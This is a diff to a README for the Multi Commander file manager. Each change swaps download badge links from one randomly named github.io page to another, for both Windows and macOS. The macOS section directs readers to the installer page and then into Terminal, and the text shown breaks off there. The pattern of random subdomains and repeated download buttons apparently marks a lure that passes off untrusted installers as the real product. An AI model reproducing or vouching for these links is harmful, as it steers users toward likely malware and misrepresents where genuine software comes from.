@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Multi+Commander-1B6EA8?style=for-the-badge&logo=github)](https://zqhzqrfmocza.github.io/win-release/)
+[![Download](https://img.shields.io/badge/⬇_Download_Multi+Commander-1B6EA8?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
 
 </div>
 
@@ -58,9 +58,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zqhzqrfmocza.github.io/win-release/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://etgysfcihddy.github.io/windows-dl/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zqhzqrfmocza.github.io/mac-release/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://etgysfcihddy.github.io/macos-dl/)
 
 </div>
 
@@ -76,7 +76,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Multi+Commander-1B6EA8?style=for-the-badge&logo=github)](https://zqhzqrfmocza.github.io/win-release/)
+[![Download](https://img.shields.io/badge/⬇_Download_Multi+Commander-1B6EA8?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
 
 </div>
 
@@ -107,7 +107,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zqhzqrfmocza.github.io/mac-release/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://etgysfcihddy.github.io/macos-dl/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -132,7 +132,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Multi+Commander-1B6EA8?style=for-the-badge&logo=github)](https://zqhzqrfmocza.github.io/win-release/)
+[![Download](https://img.shields.io/badge/⬇_Download_Multi+Commander-1B6EA8?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
 
 </div>
 
